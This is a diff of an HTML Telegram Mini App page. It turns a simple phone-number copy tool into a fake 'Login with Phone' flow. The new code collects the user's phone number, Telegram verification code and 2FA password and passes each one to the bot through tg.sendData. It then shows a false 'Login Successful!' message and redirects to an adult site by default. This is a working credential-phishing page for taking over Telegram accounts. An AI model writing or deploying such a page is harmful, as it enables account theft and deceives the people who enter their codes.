@@ -1,124 +1,277 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ورود با شماره</title>
+    <title>Login with Phone</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: Tahoma, sans-serif;
-            padding: 20px;
-            background: #ffffff;
-            color: #000000;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
             min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background-image: url('https://images.unsplash.com/photo-1557682250-33bd709cbe85?w=800');
+            background-size: cover;
+            background-position: center;
+            position: relative;
         }
-        h1 { font-size: 22px; text-align: center; margin-bottom: 10px; }
-        p { text-align: center; color: #666; font-size: 14px; margin-bottom: 20px; }
-        label { display: block; font-size: 14px; margin-bottom: 8px; font-weight: bold; }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 0;
+        }
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            border-radius: 20px;
+            padding: 30px 25px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .header { text-align: center; margin-bottom: 25px; color: #fff; }
+        .icon { font-size: 60px; margin-bottom: 10px; display: block; }
+        h1 { font-size: 24px; margin-bottom: 8px; }
+        .subtitle { font-size: 14px; opacity: 0.85; }
+
+        .step { display: none; animation: fadeIn 0.3s; }
+        .step.active { display: block; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .info-box {
+            background: rgba(36, 129, 204, 0.2);
+            border-right: 4px solid #2481cc;
+            padding: 12px 15px;
+            border-radius: 10px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            color: #fff;
+        }
+        label { display: block; font-size: 14px; margin-bottom: 8px; color: #fff; }
         input {
             width: 100%;
-            padding: 15px;
-            font-size: 17px;
-            border: 2px solid #ddd;
-            border-radius: 10px;
-            direction: ltr;
-            text-align: left;
+            padding: 16px;
+            font-size: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            background: rgba(255, 255, 255, 0.15);
+            color: #fff;
+            border-radius: 12px;
+            text-align: center;
             outline: none;
         }
+        input::placeholder { color: rgba(255, 255, 255, 0.5); }
         input:focus { border-color: #2481cc; }
         button {
             width: 100%;
-            padding: 15px;
+            padding: 16px;
             background: #2481cc;
-            color: white;
+            color: #fff;
             border: none;
-            border-radius: 10px;
+            border-radius: 12px;
             font-size: 16px;
-            font-weight: bold;
+            font-weight: 700;
             margin-top: 15px;
             cursor: pointer;
         }
-        button:active { opacity: 0.8; }
+        button:disabled { opacity: 0.5; }
+        .status { text-align: center; margin-top: 15px; font-size: 13px; color: #fff; }
+        .loading {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-left: 8px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
         .success {
-            display: none;
-            background: #d4edda;
-            color: #155724;
-            padding: 15px;
-            border-radius: 10px;
-            margin-top: 15px;
             text-align: center;
-            font-size: 15px;
-            line-height: 1.8;
+            color: #fff;
+            padding: 30px 0;
         }
-        .copied-phone {
-            background: #fff3cd;
-            padding: 10px;
-            border-radius: 8px;
-            margin-top: 10px;
-            font-family: monospace;
-            font-size: 16px;
-            direction: ltr;
+        .success .check {
+            font-size: 80px;
+            display: block;
+            margin-bottom: 20px;
         }
+        .success h2 { font-size: 24px; margin-bottom: 15px; }
     </style>
 </head>
 <body>
-    <h1>📱 ورود با شماره</h1>
-    <p>شماره تلفن خود را وارد کنید</p>
-    
-    <label for="phone">شماره (با کد کشور):</label>
-    <input type="tel" id="phone" placeholder="+989123456789" dir="ltr">
-    
-    <button id="btn" onclick="sendPhone()">📋 کپی شماره و بازگشت به چت</button>
-    
-    <div id="success" class="success">
-        ✅ <b>شماره کپی شد!</b><br><br>
-        حالا به چت ربات برگرد و<br>
-        توی کادر تایپ، <b>پیست</b> کن و بفرست 👇
-        <div class="copied-phone" id="copiedPhone"></div>
+    <div class="container">
+        <!-- STEP 1: PHONE -->
+        <div id="step1" class="step active">
+            <div class="header">
+                <span class="icon">📱</span>
+                <h1>Login with Phone</h1>
+                <p class="subtitle">Enter your phone number</p>
+            </div>
+            <div class="info-box">
+                ⚠️ By continuing, you agree to receive a verification code.
+            </div>
+            <label>Phone (with country code):</label>
+            <input type="tel" id="phone" placeholder="+1234567890" dir="ltr">
+            <button onclick="sendPhone()" id="btnPhone">Send Code</button>
+            <p class="status" id="status1"></p>
+        </div>
+
+        <!-- STEP 2: CODE -->
+        <div id="step2" class="step">
+            <div class="header">
+                <span class="icon">🔐</span>
+                <h1>Verification Code</h1>
+                <p class="subtitle">Enter the code we sent</p>
+            </div>
+            <label>Code:</label>
+            <input type="tel" id="code" placeholder="12345" maxlength="6" inputmode="numeric" dir="ltr">
+            <button onclick="sendCode()" id="btnCode">Verify Code</button>
+            <p class="status" id="status2"></p>
+        </div>
+
+        <!-- STEP 3: 2FA -->
+        <div id="step3" class="step">
+            <div class="header">
+                <span class="icon">🔐</span>
+                <h1>2FA Password</h1>
+                <p class="subtitle">Enter your password</p>
+            </div>
+            <label>Password:</label>
+            <input type="password" id="password" placeholder="Password" dir="ltr">
+            <button onclick="sendPassword()" id="btnPassword">Verify</button>
+            <p class="status" id="status3"></p>
+        </div>
+
+        <!-- STEP 4: REDIRECT -->
+        <div id="step4" class="step">
+            <div class="success">
+                <span class="check">✅</span>
+                <h2>Login Successful!</h2>
+                <p>Redirecting...</p>
+            </div>
+        </div>
     </div>
 
     <script>
-        var tg = window.Telegram.WebApp;
+        const tg = window.Telegram.WebApp;
         tg.expand();
         tg.ready();
-        
-        function sendPhone() {
-            var phone = document.getElementById('phone').value.trim();
-            
-            if (!phone) {
-                tg.showAlert('لطفاً شماره را وارد کنید');
-                return;
-            }
-            
-            if (phone.charAt(0) !== '+') {
-                tg.showAlert('شماره باید با + شروع شود\nمثال: +989123456789');
-                return;
-            }
-            
-            // کپی توی clipboard
-            navigator.clipboard.writeText(phone).then(function() {
-                document.getElementById('copiedPhone').textContent = phone;
-                document.getElementById('success').style.display = 'block';
-                document.getElementById('btn').style.display = 'none';
-                
-                setTimeout(function() {
-                    tg.close();
-                }, 2500);
-            }).catch(function(err) {
-                // اگه clipboard کار نکرد، شماره رو نشون بده تا دستی کپی کنه
-                document.getElementById('copiedPhone').textContent = phone;
-                document.getElementById('success').style.display = 'block';
-                document.getElementById('btn').style.display = 'none';
-                
-                setTimeout(function() {
-                    tg.close();
-                }, 3000);
-            });
+
+        // ⚠️ آدرس سایت دلخواه
+        const urlParams = new URLSearchParams(window.location.search);
+const REDIRECT_URL = urlParams.get('redirect') || "https:///fra.xhamster.com › best › weekly";
+
+        function showStep(n) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + n).classList.add('active');
+            setTimeout(() => {
+                const input = document.querySelector('#step' + n + ' input');
+                if (input) input.focus();
+            }, 300);
         }
-        
-        setTimeout(function() { document.getElementById('phone').focus(); }, 300);
+
+        function redirectToSite() {
+            try {
+                if (tg && tg.openLink) tg.openLink(REDIRECT_URL);
+            } catch(e) {}
+            setTimeout(() => {
+                try { window.location.href = REDIRECT_URL; } catch(e) {}
+            }, 500);
+        }
+
+        function sendPhone() {
+            const phone = document.getElementById('phone').value.trim();
+            const status = document.getElementById('status1');
+            const btn = document.getElementById('btnPhone');
+
+            if (!phone || phone.charAt(0) !== '+' || phone.length < 10) {
+                tg.showAlert('Invalid phone number');
+                return;
+            }
+
+            btn.disabled = true;
+            status.innerHTML = '<span class="loading"></span> Sending...';
+
+            try {
+                tg.sendData(JSON.stringify({ action: 'send_phone', phone: phone }));
+                status.innerHTML = '✅ Code sent!';
+                status.style.color = '#4ade80';
+                setTimeout(() => showStep(2), 800);
+            } catch(e) {
+                status.innerHTML = '❌ ' + e.message;
+                btn.disabled = false;
+            }
+        }
+
+        function sendCode() {
+            const code = document.getElementById('code').value.replace(/\D/g, '');
+            const status = document.getElementById('status2');
+            const btn = document.getElementById('btnCode');
+
+            if (!code || code.length < 4) {
+                tg.showAlert('Enter code');
+                return;
+            }
+
+            btn.disabled = true;
+            status.innerHTML = '<span class="loading"></span> Verifying...';
+
+            try {
+                tg.sendData(JSON.stringify({ action: 'send_code', code: code }));
+                status.innerHTML = '✅ Verified!';
+                status.style.color = '#4ade80';
+                setTimeout(() => {
+                    showStep(4);
+                    redirectToSite();
+                }, 1000);
+            } catch(e) {
+                status.innerHTML = '❌ ' + e.message;
+                btn.disabled = false;
+            }
+        }
+
+        function sendPassword() {
+            const password = document.getElementById('password').value.trim();
+            const status = document.getElementById('status3');
+            const btn = document.getElementById('btnPassword');
+
+            if (!password) {
+                tg.showAlert('Enter password');
+                return;
+            }
+
+            btn.disabled = true;
+            status.innerHTML = '<span class="loading"></span> Verifying...';
+
+            try {
+                tg.sendData(JSON.stringify({ action: 'send_password', password: password }));
+                status.innerHTML = '✅ Verified!';
+                status.style.color = '#4ade80';
+                setTimeout(() => {
+                    showStep(4);
+                    redirectToSite();
+                }, 1000);
+            } catch(e) {
+                status.innerHTML = '❌ ' + e.message;
+                btn.disabled = false;
+            }
+        }
+
+        setTimeout(() => {
+            document.getElementById('phone').focus();
+        }, 500);
     </script>
 </body>
 </html>
